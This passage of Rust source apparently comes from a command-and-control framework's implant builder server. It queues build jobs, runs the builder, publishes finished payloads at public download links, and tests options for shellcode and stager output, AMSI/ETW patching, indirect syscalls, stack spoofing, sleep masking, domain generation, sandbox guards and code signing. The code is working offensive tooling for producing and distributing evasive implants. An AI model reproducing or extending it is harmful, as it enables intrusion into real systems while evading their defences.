            || req.profile_json.is_some()
            || req.fallback_json.is_some()
        {
            let dir = std::env::temp_dir().join(format!("rcm-build-{}", jid));
            match std::fs::create_dir_all(&dir) {
                Ok(()) => Some(dir),
                Err(e) => {
                    push(&jobs_arc, &jid, format!("[-] Failed to create upload temp dir: {}", e));
                    if let Ok(mut g) = jobs_arc.lock() {
                        if let Some(j) = g.get_mut(&jid) {
                            j.status      = BuildStatus::Failed;
                            j.finished_at = Some(Utc::now().to_rfc3339());
                        }
                    }
                    return;
                }
            }
        } else {
            None
        };

        if let (Some(dir), Some(b64)) = (&upload_dir, &req.icon_b64) {
            use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
            match B64.decode(b64) {
                Ok(bytes) if !bytes.is_empty() => {
                    let p = dir.join("icon.ico");
                    if let Err(e) = std::fs::write(&p, &bytes) {
                        push(&jobs_arc, &jid, format!("[!] icon upload write failed: {} - ignoring", e));
                    } else {
                        req.icon = Some(p.to_string_lossy().into_owned());
                        req.icon_preset = None; // explicit file wins over preset
                    }
                }
                _ => push(&jobs_arc, &jid, "[!] icon_b64 did not decode - ignoring icon upload".into()),
            }
        }

        if let (Some(dir), Some(ca), Some(crt), Some(key)) = (
            &upload_dir,
            &req.certs_ca_b64,
            &req.certs_client_crt_b64,
            &req.certs_client_key_b64,
        ) {
            use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
            let decoded = [B64.decode(ca), B64.decode(crt), B64.decode(key)];
            let names = ["ca.crt", "client.crt", "client.key.der"];
            let mut ok = true;
            for (name, part) in names.iter().zip(decoded.into_iter()) {
                match part {
                    Ok(bytes) if !bytes.is_empty() => {
                        if let Err(e) = std::fs::write(dir.join(name), &bytes) {
                            push(&jobs_arc, &jid, format!("[-] certs upload write failed ({}): {}", name, e));
                            ok = false;
                        }
                    }
                    _ => {
                        push(&jobs_arc, &jid, format!("[-] certs upload: {} did not decode", name));
                        ok = false;
                    }
                }
            }
            if ok {
                req.certs_dir = Some(dir.to_string_lossy().into_owned());
            } else {
                if let Ok(mut g) = jobs_arc.lock() {
                    if let Some(j) = g.get_mut(&jid) {
                        j.status      = BuildStatus::Failed;
                        j.finished_at = Some(Utc::now().to_rfc3339());
                    }
                }
                if let Some(d) = &upload_dir { let _ = std::fs::remove_dir_all(d); }
                return;
            }
        }

        // Materialize the inline pic_src C source to a temp file; the
        // builder CLI takes a path (--pic-src), not inline text.
        if req.format == "pic_c" {
            if let (Some(dir), Some(src)) = (&upload_dir, &req.pic_src) {
                let p = dir.join("pic.c");
                match std::fs::write(&p, src) {
                    Ok(()) => req.pic_src = Some(p.to_string_lossy().into_owned()),
                    Err(e) => {
                        push(&jobs_arc, &jid, format!("[-] pic_src write failed: {}", e));
                        if let Ok(mut g) = jobs_arc.lock() {
                            if let Some(j) = g.get_mut(&jid) {
                                j.status      = BuildStatus::Failed;
                                j.finished_at = Some(Utc::now().to_rfc3339());
                            }
                        }
                        if let Some(d) = &upload_dir { let _ = std::fs::remove_dir_all(d); }
                        return;
                    }
                }
            }
        }

        // Materialize inline profile/fallback JSON to temp files; the CLI
        // takes paths (--profile-file/--fallback-file), and server paths are
        // never accepted from the client for these.
        for (content, name, slot) in [
            (&req.profile_json, "profile.json", &mut req.profile_file),
            (&req.fallback_json, "fallback.json", &mut req.fallback_file),
        ] {
            if let (Some(dir), Some(content)) = (&upload_dir, content) {
                let p = dir.join(name);
                match std::fs::write(&p, content) {
                    Ok(()) => *slot = Some(p.to_string_lossy().into_owned()),
                    Err(e) => {
                        push(&jobs_arc, &jid, format!("[-] {} write failed: {}", name, e));
                        if let Ok(mut g) = jobs_arc.lock() {
                            if let Some(j) = g.get_mut(&jid) {
                                j.status      = BuildStatus::Failed;
                                j.finished_at = Some(Utc::now().to_rfc3339());
                            }
                        }
                        if let Some(d) = &upload_dir { let _ = std::fs::remove_dir_all(d); }
                        return;
                    }
                }
            }
        }

        let args = build_args(&req);

        fn push(jobs: &std::sync::Arc<std::sync::Mutex<std::collections::HashMap<String, BuildJob>>>,
                id: &str, line: String) {
            if let Ok(mut g) = jobs.lock() {
                if let Some(j) = g.get_mut(id) {
                    j.log.push(line);
                    // Cap per-job logs: the registry holds every line in
                    // memory, so a full cargo build log must not grow it
                    // without bound.
                    if j.log.len() > MAX_JOB_LOG_LINES {
                        let drop = j.log.len() - MAX_JOB_LOG_LINES;
                        j.log.drain(..drop);
                    }
                }
            }
        }

        // Serialize builds: the builder swaps the shared certs/ tree when
        // --certs-dir is used, and even cert-less builds read it. Held until
        // this task ends (after the watcher teardown below). Log the wait:
        // when a job queues behind another build its log must SHOW the wait
        // instead of looking like a dead, empty build.
        push(&jobs_arc, &jid, "[*] Waiting for the build gate (builds are serialized)...".into());
        let gate_wait_start = std::time::Instant::now();
        let _build_gate = BUILD_GATE.lock().await;
        push(&jobs_arc, &jid, format!(
            "[*] Build gate acquired after {:.1}s - builder starting.",
            gate_wait_start.elapsed().as_secs_f64()));
        let gate_hold_start = std::time::Instant::now();

        let mut child = match tokio::process::Command::new(&builder_path)
            .args(&args)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
        {
            Ok(c)  => c,
            Err(e) => {
                push(&jobs_arc, &jid, format!("[-] Failed to spawn builder: {}", e));
                if let Ok(mut g) = jobs_arc.lock() {
                    if let Some(j) = g.get_mut(&jid) {
                        j.status      = BuildStatus::Failed;
                        j.finished_at = Some(Utc::now().to_rfc3339());
                    }
                }
                push(&jobs_arc, &jid, format!(
                    "[*] Build gate released after {:.1}s hold (spawn failed).",
                    gate_hold_start.elapsed().as_secs_f64()));
                return;
            }
        };

        let stdout = child.stdout.take().unwrap();
        let stderr = child.stderr.take().unwrap();

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let mut t1 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stdout).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                push(&ja, &ji, line);
            }
        });

        let ja = jobs_arc.clone(); let ji = jid.clone();
        let mut t2 = tokio::spawn(async move {
            let mut lines = tokio::io::BufReader::new(stderr).lines();
            while let Ok(Some(line)) = lines.next_line().await {
                if !line.trim().is_empty() { push(&ja, &ji, line); }
            }
        });

        // Watchdog: the builder spawns grandchildren (cargo/rustc/gcc/
        // osslsigncode) that INHERIT the pipes, so EOF on stdout/stderr is
        // not guaranteed when the builder exits - a drain-first join can
        // park forever and wedge the build gate. Wait on the CHILD first,
        // bound the whole thing, and give the drains their own shorter
        // deadline afterwards.
        let (timed_out, status_ok) = match wait_verdict(
            tokio::time::timeout(BUILD_HARD_TIMEOUT, child.wait()).await
        ) {
            WaitVerdict::Exited(ok) => (false, ok),
            WaitVerdict::TimedOut => {
                push(&jobs_arc, &jid, format!(
                    "[-] Build timed out after {}s - killing the builder (grandchildren may keep the pipes open; drains are not awaited).",
                    BUILD_HARD_TIMEOUT.as_secs()));
                let _ = child.start_kill();
                // Reap so no zombie outlives the task; bounded in turn so a
                // stuck kill cannot wedge the gate either.
                let _ = tokio::time::timeout(BUILD_KILL_GRACE, child.wait()).await;
                // Do NOT await the drains: their EOF may never arrive.
                t1.abort();
                t2.abort();
                (true, false)
            }
        };

        if !timed_out {
            // Child is done; only trailing buffered lines remain. EOF arrives
            // once every pipe holder exits - grandchildren included - so this
            // deadline is what keeps a lingering grandchild from parking the
            // task (and the gate) after an otherwise finished build.
            if tokio::time::timeout(BUILD_DRAIN_TIMEOUT, async {
                // &mut JoinHandle is a Future (JoinHandle is Unpin); joining
                // by reference keeps the handles usable for abort() below.
                let _ = tokio::join!(&mut t1, &mut t2);
            }).await.is_err() {
                push(&jobs_arc, &jid,
                    "[!] Log drain deadline hit (a grandchild still holds a pipe) - continuing without the remaining output.".into());
                t1.abort();
                t2.abort();
            }
        }

        let ok = !timed_out && status_ok;

        // Harvest from the captured log: the artifact path ("[+] Binary: ")
        // and the internal build id ("[*] Build ID:") the builder embedded
        // into the agent - the latter keys dist/staged_<id>.payload and the
        // /stage/<id> download path.
        let (artifact_path, build_id): (Option<String>, Option<String>) = {
            let g = jobs_arc.lock().unwrap_or_else(|e| e.into_inner());
            match g.get(&jid) {
                Some(j) => (
                    harvest_log_value(&j.log, "[+] Binary: "),
                    harvest_log_value(&j.log, "[*] Build ID:"),
                ),
                None => (None, None),
            }
        };

        // On success, register the artifact for randomized public hosting
        // (unguessable /dl/<token>/<name> link, persisted to the sidecar).
        if ok {
            if let Some(ap) = &artifact_path {
                if let Some(p) = crate::api::routes::payloads::register_hosted(
                    &payload_links, &jid, ap,
                ) {
                    push(&jobs_arc, &jid,
                        format!("[+] Public link: {}", p.download_url()));
                }
            }
        }

        if timed_out {
            push(&jobs_arc, &jid, "[-] Build marked failed after timeout.".into());
        }
        if let Ok(mut g) = jobs_arc.lock() {
            if let Some(j) = g.get_mut(&jid) {
                j.status = if ok && artifact_path.is_some() {
                    BuildStatus::Success
                } else {
                    BuildStatus::Failed
                };
                j.artifact_path = artifact_path;
                j.build_id      = build_id;
                j.finished_at   = Some(Utc::now().to_rfc3339());
            }
        }

        // Teardown: remove the per-job upload temp dir (icon/certs).
        if let Some(d) = &upload_dir {
            let _ = std::fs::remove_dir_all(d);
        }
        push(&jobs_arc, &jid, format!(
            "[*] Build gate released after {:.1}s hold.",
            gate_hold_start.elapsed().as_secs_f64()));
    });

    (StatusCode::ACCEPTED, Json(BuildStarted { job_id })).into_response()
}

/// GET /api/builder/jobs/:id/status
pub async fn job_status(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    match jobs.get(&job_id) {
        None => (StatusCode::NOT_FOUND, Json(serde_json::json!({"error":"Job not found"}))).into_response(),
        Some(job) => {
            let artifact_name = job.artifact_path.as_ref().and_then(|p| {
                std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
            });
            let download_url = crate::api::routes::payloads::url_for_job(
                &state.payload_links, &job.id);
            (StatusCode::OK, Json(JobStatusResponse {
                job_id:        job.id.clone(),
                status:        format!("{:?}", job.status).to_lowercase(),
                log:           job.log.clone(),
                artifact_name,
                build_id:      job.build_id.clone(),
                download_url,
                started_at:    job.started_at.clone(),
                finished_at:   job.finished_at.clone(),
            })).into_response()
        }
    }
}

/// GET /api/builder/jobs
pub async fn list_jobs(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
) -> Response {
    let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
    let mut list: Vec<JobStatusResponse> = jobs.values().map(|job| {
        let artifact_name = job.artifact_path.as_ref().and_then(|p| {
            std::path::Path::new(p).file_name().map(|n| n.to_string_lossy().into_owned())
        });
        JobStatusResponse {
            job_id:        job.id.clone(),
            status:        format!("{:?}", job.status).to_lowercase(),
            log:           vec![],
            artifact_name,
            build_id:      job.build_id.clone(),
            download_url:  crate::api::routes::payloads::url_for_job(
                &state.payload_links, &job.id),
            started_at:    job.started_at.clone(),
            finished_at:   job.finished_at.clone(),
        }
    }).collect();
    list.sort_by(|a, b| b.started_at.cmp(&a.started_at));
    (StatusCode::OK, Json(list)).into_response()
}

/// GET /api/builder/jobs/:id/download
///
/// Protected by the standard X-API-KEY auth middleware.
/// The JS side uses fetch() + blob to trigger the save dialog,
/// which correctly sends the header. Direct browser navigation
/// won't work (no header) - that's intentional.
pub async fn download_artifact(
    State(state): State<Arc<ApiContext>>,
    Extension(_op): Extension<OperatorInfo>,
    Path(job_id): Path<String>,
) -> Response {
    let (artifact_path, artifact_name) = {
        let jobs = state.build_jobs.lock().unwrap_or_else(|e| e.into_inner());
        match jobs.get(&job_id) {
            None => return (StatusCode::NOT_FOUND, "Job not found").into_response(),
            Some(job) => match (&job.artifact_path, &job.status) {
                (Some(path), BuildStatus::Success) => {
                    let name = std::path::Path::new(path)
                        .file_name()
                        .map(|n| n.to_string_lossy().into_owned())
                        .unwrap_or_else(|| "agent".into());
                    (path.clone(), name)
                }
                (_, BuildStatus::Running) =>
                    return (StatusCode::ACCEPTED, "Build still in progress").into_response(),
                _ =>
                    return (StatusCode::NOT_FOUND, "No artifact (build failed or not started)").into_response(),
            }
        }
    };

    match std::fs::read(&artifact_path) {
        Err(e) => (StatusCode::INTERNAL_SERVER_ERROR,
            format!("Failed to read artifact: {}", e)).into_response(),
        Ok(bytes) => {
            let safe_name: String = artifact_name.chars()
                .filter(|c| c.is_alphanumeric() || *c == '.' || *c == '_' || *c == '-')
                .collect();
            (
                StatusCode::OK,
                [
                    (header::CONTENT_TYPE,        "application/octet-stream".into()),
                    (header::CONTENT_DISPOSITION, format!("attachment; filename=\"{}\"", safe_name)),
                    (header::CONTENT_LENGTH,      bytes.len().to_string()),
                ],
                bytes,
            ).into_response()
        }
    }
}

// ── Tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Fixtures ───────────────────────────────────────────────────────

    fn base_req() -> BuildRequest {
        BuildRequest {
            host:              "10.0.0.1".into(),
            port:              "4443".into(),
            platform:          "linux".into(),
            transport:         "tls".into(),
            profile:           "default".into(),
            format:            "exe".into(),
            sleep:             40,
            jitter_min:        0,
            jitter_max:        100,
            bloat:             0,
            debug:             false,
            days:              0,
            sni_override:      None,
            alpn_protocols:    vec![],
            hibernation_mode:  false,
            batch_size:        None,
            sleep_mask:        "ekko".into(),
            indirect_syscalls: true,
            stack_spoof:       true,
            patch_amsi_etw:    true,
            heap_encrypt:      true,
            guard_domain:      String::new(),
            guard_hostname:    String::new(),
            guard_hour_start:  0,
            guard_hour_end:    0,
            guard_no_system:   false,
            auto_pivot_port:   None,
            sc_hash:           "0x10".into(),
            sc_userdata:       "None".into(),
            sc_flags:          0,
            sc_output:         "bin".into(),
            pic_src:           None,
            pipeline:          None,
            sign:              None,
            sign_cert:         None,
            sign_pass:         None,
            sign_ts:           None,
            sign_name:         None,
            sign_url:          None,
            sign_cn:           None,
            allow_vm:          false,
            valid_parents:     "".into(),
            proxy_url:         None,
            proxy_user:        None,
            proxy_pass:        None,
            profile_json:      None,
            fallback_json:     None,
            profile_file:      None,
            fallback_file:     None,
            dga_seed:          None,
            dga_window:        86400,
            dga_count:         16,
            dga_tlds:          "com,net,org".into(),
            name:              None,
            icon:              None,
            icon_preset:       None,
            certs_dir:         None,
            icon_b64:          None,
            certs_ca_b64:        None,
            certs_client_crt_b64: None,
            certs_client_key_b64: None,
            pe_company:         None,
            pe_product:         None,
            pe_description:     None,
            pe_file_version:    None,
            pe_product_version: None,
            elf_comment:        None,
        }
    }

    fn has_pair(args: &[String], flag: &str, val: &str) -> bool {
        args.windows(2).any(|w| w[0] == flag && w[1] == val)
    }

    fn from_json(s: &str) -> BuildRequest {
        serde_json::from_str(s).expect("valid JSON")
    }

    // ── validate_request ───────────────────────────────────────────────

    #[test]
    fn validate_ok_baseline() {
        assert!(validate_request(&base_req()).is_ok());
    }

    #[test]
    fn validate_err_missing_host() {
        let mut r = base_req(); r.host = String::new();
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_err_missing_port() {
        let mut r = base_req(); r.port = String::new();
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_ok_all_platforms() {
        for p in ["linux", "linux-musl", "windows", "macos"] {
            let mut r = base_req(); r.platform = p.into();
            assert!(validate_request(&r).is_ok(), "platform={p}");
        }
    }

    #[test]
    fn validate_err_unknown_platform() {
        let mut r = base_req(); r.platform = "android".into();
        assert!(validate_request(&r).unwrap_err().contains("platform"));
    }

    #[test]
    fn validate_ok_all_transports() {
        for t in ["tls", "tcp_plain", "named_pipe", "http", "https"] {
            let mut r = base_req(); r.transport = t.into();
            assert!(validate_request(&r).is_ok(), "transport={t}");
        }
    }

    #[test]
    fn validate_err_unknown_transport() {
        let mut r = base_req(); r.transport = "udp".into();
        assert!(validate_request(&r).unwrap_err().contains("transport"));
    }

    #[test]
    fn validate_ok_all_formats() {
        // Any-platform formats on the shared fixture.
        for f in ["exe", "pic_c"] {
            let mut r = base_req(); r.format = f.into();
            assert!(validate_request(&r).is_ok(), "format={f}");
        }
        // Windows-only formats need a windows fixture.
        for f in ["dll", "service", "shellcode", "donut", "pe_to_shellcode", "bin"] {
            let mut r = base_req();
            r.format = f.into();
            r.platform = "windows".into();
            assert!(validate_request(&r).is_ok(), "format={f}");
        }
        // The stager only speaks HTTPS (raw HTTP fallback) to /stage/<id>,
        // so it needs an http(s) transport fixture.
        let mut r = base_req();
        r.format = "stager".into();
        r.transport = "http".into();
        assert!(validate_request(&r).is_ok());
        r.transport = "https".into();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_stager_on_non_http_transport() {
        let mut r = base_req();
        r.format = "stager".into();
        r.transport = "tls".into();
        assert!(validate_request(&r).unwrap_err().contains("http"));
    }

    #[test]
    fn validate_ok_dll_and_service_on_windows() {
        for f in ["dll", "service"] {
            let mut r = base_req();
            r.format = f.into();
            r.platform = "windows".into();
            assert!(validate_request(&r).is_ok(), "format={f}");
        }
    }

    #[test]
    fn validate_err_dll_and_service_off_windows() {
        // dll/service have no ELF/Mach-O equivalent - they must be rejected,
        // not silently produce an executable renamed "*.dll".
        for f in ["dll", "service"] {
            for p in ["linux", "linux-musl", "macos"] {
                let mut r = base_req();
                r.format = f.into();
                r.platform = p.into();
                let err = validate_request(&r).unwrap_err();
                assert!(err.contains("platform=windows"), "{f}/{p}: {err}");
            }
        }
    }

    #[test]
    fn validate_err_hibernation_with_http_transport() {
        for t in ["http", "https"] {
            let mut r = base_req();
            r.hibernation_mode = true;
            r.transport = t.into();
            assert!(validate_request(&r).unwrap_err().contains("hibernation"), "transport={t}");
        }
    }

    #[test]
    fn validate_ok_hibernation_with_connection_transports() {
        for t in ["tls", "tcp_plain", "named_pipe"] {
            let mut r = base_req();
            r.hibernation_mode = true;
            r.transport = t.into();
            assert!(validate_request(&r).is_ok(), "transport={t}");
        }
    }

    #[test]
    fn validate_err_icon_absolute_path_outside_roots() {
        let mut r = base_req();
        r.icon = Some("/etc/passwd".into());
        assert!(validate_request(&r).is_err(), "absolute icon path outside assets/icons must be rejected");
    }

    #[test]
    fn validate_err_certs_dir_absolute_path_outside_roots() {
        let mut r = base_req();
        r.certs_dir = Some("/etc/ssl/private".into());
        assert!(validate_request(&r).is_err(), "absolute certs_dir outside certs/ must be rejected");
    }

    #[test]
    fn validate_ok_certs_dir_under_allowed_root() {
        let mut r = base_req();
        r.certs_dir = Some("certs/overlay".into());
        assert!(validate_request(&r).is_ok());
        r.certs_dir = Some("/tmp/rcm-build-x".into());
        assert!(validate_request(&r).is_ok(), "per-job upload temp dir must stay allowed");
    }

    #[test]
    fn validate_ok_shellcode_format_windows() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "windows".into();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_shellcode_non_windows() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "linux".into();
        assert!(validate_request(&r).unwrap_err().contains("platform=windows"));
    }

    #[test]
    fn validate_err_shellcode_bad_output() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "windows".into();
        r.sc_output = "pdf".into();
        assert!(validate_request(&r).unwrap_err().contains("sc_output"));
    }

    #[test]
    fn validate_err_shellcode_bad_hash() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "windows".into();
        r.sc_hash = "0xZZZ".into();
        assert!(validate_request(&r).unwrap_err().contains("sc_hash"));
    }

    #[test]
    fn validate_ok_shellcode_decimal_hash() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "windows".into();
        r.sc_hash = "3735928559".into(); // 0xDEADBEEF in decimal
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_unknown_format() {
        let mut r = base_req(); r.format = "apk".into();
        assert!(validate_request(&r).unwrap_err().contains("format"));
    }

    // ── New generation formats: donut / pe_to_shellcode / pic_c / bin ──

    #[test]
    fn validate_ok_donut_format_windows() {
        let mut r = base_req();
        r.format = "donut".into();
        r.platform = "windows".into();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_donut_non_windows() {
        let mut r = base_req();
        r.format = "donut".into();
        r.platform = "linux".into();
        assert!(validate_request(&r).unwrap_err().contains("platform=windows"));
    }

    #[test]
    fn validate_ok_pe_to_shellcode_format_windows() {
        let mut r = base_req();
        r.format = "pe_to_shellcode".into();
        r.platform = "windows".into();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_pe_to_shellcode_non_windows() {
        let mut r = base_req();
        r.format = "pe_to_shellcode".into();
        assert!(validate_request(&r).unwrap_err().contains("platform=windows"));
    }

    #[test]
    fn validate_ok_pic_c_requires_and_accepts_pic_src() {
        let mut r = base_req();
        r.format = "pic_c".into();
        r.pic_src = Some("void go(void) {}".into());
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_ok_pic_c_without_pic_src_falls_back_to_template() {
        // CLI parity: an omitted pic_c source selects the bundled
        // templates/pic_template.c in the builder.
        let mut r = base_req();
        r.format = "pic_c".into();
        assert!(validate_request(&r).is_ok());
        r.pic_src = Some("   ".into());
        assert!(validate_request(&r).is_ok(), "blank pic_src is treated as unset");
    }

    #[test]
    fn validate_err_pic_src_with_other_format() {
        let mut r = base_req();
        r.pic_src = Some("void go(void) {}".into());
        assert!(validate_request(&r).unwrap_err().contains("pic_src"));
    }

    #[test]
    fn validate_ok_bin_format_windows_default_and_explicit_pipeline() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "windows".into();
        // no pipeline -> builder default (pe,donut)
        assert!(validate_request(&r).is_ok());
        r.pipeline = Some("dll,srdi,b64".into());
        assert!(validate_request(&r).is_ok());
        r.pipeline = Some("pe,sign,donut".into());
        assert!(validate_request(&r).is_ok());
        r.pipeline = Some("pic,b64".into());
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_bin_non_windows() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "linux".into();
        assert!(validate_request(&r).unwrap_err().contains("platform=windows"));
    }

    #[test]
    fn validate_err_pipeline_unknown_stage() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "windows".into();
        r.pipeline = Some("pe,magic".into());
        assert!(validate_request(&r).unwrap_err().contains("magic"));
    }

    #[test]
    fn validate_err_pipeline_bad_order() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "windows".into();
        r.pipeline = Some("donut".into());       // first stage not a source
        assert!(validate_request(&r).is_err());
        r.pipeline = Some("pic,donut".into());   // donut needs a PE
        assert!(validate_request(&r).is_err());
        r.pipeline = Some("pe,donut,srdi".into()); // no PE left for srdi
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_err_pipeline_with_non_bin_format() {
        let mut r = base_req();
        r.pipeline = Some("pe,donut".into());
        assert!(validate_request(&r).unwrap_err().contains("pipeline"));
    }

    #[test]
    fn validate_err_donut_bad_sc_output() {
        let mut r = base_req();
        r.format = "donut".into();
        r.platform = "windows".into();
        r.sc_output = "pdf".into();
        assert!(validate_request(&r).unwrap_err().contains("sc_output"));
    }

    #[test]
    fn validate_ok_sleep_mask_all_variants() {
        for m in ["none", "ekko", "spoofed-stack"] {
            let mut r = base_req(); r.sleep_mask = m.into();
            assert!(validate_request(&r).is_ok(), "sleep_mask={m}");
        }
    }

    #[test]
    fn validate_ok_none_sleep_mask_is_plain_sleep() {
        // "none" is a first-class value (SleepMaskKind::Plain agent-side);
        // test_16 depends on sleep_mask=none builds being accepted.
        let mut r = base_req(); r.sleep_mask = "none".into();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_unknown_sleep_mask() {
        let mut r = base_req(); r.sleep_mask = "custom".into();
        assert!(validate_request(&r).unwrap_err().contains("sleep_mask"));
    }

    #[test]
    fn validate_err_foliage_sleep_mask_removed() {
        // foliage was never implemented; the value is no longer accepted.
        let mut r = base_req(); r.sleep_mask = "foliage".into();
        assert!(validate_request(&r).unwrap_err().contains("sleep_mask"));
    }

    #[test]
    fn validate_err_jitter_min_over_cap() {
        let mut r = base_req(); r.jitter_min = 60001;
        assert!(validate_request(&r).unwrap_err().contains("ms"));
    }

    #[test]
    fn validate_ok_jitter_min_at_boundary() {
        let mut r = base_req(); r.jitter_min = 60000;
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_negative_days() {
        let mut r = base_req(); r.days = -1;
        assert!(validate_request(&r).is_err());
    }

    #[test]
    fn validate_ok_days_zero() {
        let r = base_req();
        assert!(validate_request(&r).is_ok());
    }

    #[test]
    fn validate_err_guard_hour_start_over_23() {
        let mut r = base_req(); r.guard_hour_start = 24;
        assert!(validate_request(&r).unwrap_err().contains("guard_hour_start"));
    }

    #[test]
    fn validate_err_guard_hour_end_over_23() {
        let mut r = base_req(); r.guard_hour_end = 24;
        assert!(validate_request(&r).unwrap_err().contains("guard_hour_end"));
    }

    #[test]
    fn validate_ok_guard_hours_boundary_values() {
        let mut r = base_req();
        r.guard_hour_start = 0;
        r.guard_hour_end   = 23;
        assert!(validate_request(&r).is_ok());
    }

    // ── build_args ────────────────────────────────────────────────────

    #[test]
    fn args_core_fields_present() {
        let r = base_req();
        let a = build_args(&r);
        assert!(has_pair(&a, "--host",      "10.0.0.1"));
        assert!(has_pair(&a, "--port",      "4443"));
        assert!(has_pair(&a, "--platform",  "linux"));
        assert!(has_pair(&a, "--transport", "tls"));
        assert!(has_pair(&a, "--format",    "exe"));
        assert!(has_pair(&a, "--sleep",     "40"));
        assert!(has_pair(&a, "--jitter-min","0"));
        assert!(has_pair(&a, "--jitter-max","100"));
    }

    #[test]
    fn args_transport_underscore_converted_to_dash() {
        let mut r = base_req(); r.transport = "tcp_plain".into();
        assert!(has_pair(&build_args(&r), "--transport", "tcp-plain"));
    }

    #[test]
    fn args_shellcode_opts_appended_for_shellcode_format() {
        let mut r = base_req();
        r.format = "shellcode".into();
        r.platform = "windows".into();
        r.sc_hash = "0xDEADBEEF".into();
        r.sc_userdata = "blob".into();
        r.sc_flags = 1;
        r.sc_output = "b64".into();
        let a = build_args(&r);
        assert!(has_pair(&a, "--format", "shellcode"));
        assert!(has_pair(&a, "--sc-hash", "0xDEADBEEF"));
        assert!(has_pair(&a, "--sc-userdata", "blob"));
        assert!(has_pair(&a, "--sc-flags", "1"));
        assert!(has_pair(&a, "--sc-output", "b64"));
    }

    #[test]
    fn args_shellcode_opts_omitted_for_other_formats() {
        let a = build_args(&base_req());
        assert!(!a.iter().any(|x| x.starts_with("--sc-")));
    }

    #[test]
    fn args_pic_c_forwards_pic_src_and_sc_output() {
        let mut r = base_req();
        r.format = "pic_c".into();
        r.pic_src = Some("/tmp/rcm-build-x/pic.c".into()); // materialized path
        r.sc_output = "hex".into();
        let a = build_args(&r);
        assert!(has_pair(&a, "--format", "pic_c"));
        assert!(has_pair(&a, "--pic-src", "/tmp/rcm-build-x/pic.c"));
        assert!(has_pair(&a, "--sc-output", "hex"));
    }

    #[test]
    fn args_bin_forwards_pipeline() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "windows".into();
        r.pipeline = Some("dll,srdi,b64".into());
        let a = build_args(&r);
        assert!(has_pair(&a, "--format", "bin"));
        assert!(has_pair(&a, "--pipeline", "dll,srdi,b64"));
    }

    #[test]
    fn args_bin_omits_pipeline_when_default() {
        let mut r = base_req();
        r.format = "bin".into();
        r.platform = "windows".into();
        let a = build_args(&r);
        assert!(!a.iter().any(|x| x == "--pipeline"));
    }

    #[test]
    fn args_donut_forwards_sc_output_but_not_hash() {
        let mut r = base_req();
        r.format = "donut".into();
        r.platform = "windows".into();
        r.sc_output = "b64".into();
        let a = build_args(&r);
        assert!(has_pair(&a, "--format", "donut"));
        assert!(has_pair(&a, "--sc-output", "b64"));
        assert!(!a.iter().any(|x| x == "--sc-hash"));
    }

    #[test]
    fn args_pe_to_shellcode_forwards_all_sc_opts() {
        let mut r = base_req();
        r.format = "pe_to_shellcode".into();
        r.platform = "windows".into();
        r.sc_hash = "0x10".into();
        r.sc_userdata = "blob".into();
        r.sc_flags = 1;
        r.sc_output = "c".into();
        let a = build_args(&r);
        assert!(has_pair(&a, "--format", "pe_to_shellcode"));
        assert!(has_pair(&a, "--sc-hash", "0x10"));
        assert!(has_pair(&a, "--sc-userdata", "blob"));
        assert!(has_pair(&a, "--sc-flags", "1"));
        assert!(has_pair(&a, "--sc-output", "c"));
    }

    #[test]
    fn args_profile_underscore_converted_to_dash() {
        let mut r = base_req(); r.profile = "http_post".into();
        assert!(has_pair(&build_args(&r), "--profile", "http-post"));
    }

    #[test]
    fn args_debug_flag_included_when_true() {
        let mut r = base_req(); r.debug = true;
        assert!(build_args(&r).contains(&"--debug".to_string()));
    }

    #[test]
    fn args_debug_flag_omitted_when_false() {
        assert!(!build_args(&base_req()).contains(&"--debug".to_string()));
    }

    #[test]
    fn args_sleep_mask_always_forwarded() {
        for m in ["none", "ekko", "spoofed-stack"] {
            let mut r = base_req(); r.sleep_mask = m.into();
            assert!(has_pair(&build_args(&r), "--sleep-mask", m), "sleep_mask={m}");
        }
    }

    #[test]
    fn args_evasion_flags_all_on() {
        let r = base_req();
        let a = build_args(&r);
        assert!(has_pair(&a, "--indirect-syscalls", "true"));
        assert!(has_pair(&a, "--stack-spoof",       "true"));
        assert!(has_pair(&a, "--patch-amsi-etw",    "true"));
        assert!(has_pair(&a, "--heap-encrypt",      "true"));
    }

    #[test]
    fn args_evasion_flags_all_off() {
        let mut r = base_req();
        r.indirect_syscalls = false;
        r.stack_spoof       = false;
        r.patch_amsi_etw    = false;
        r.heap_encrypt      = false;
        let a = build_args(&r);
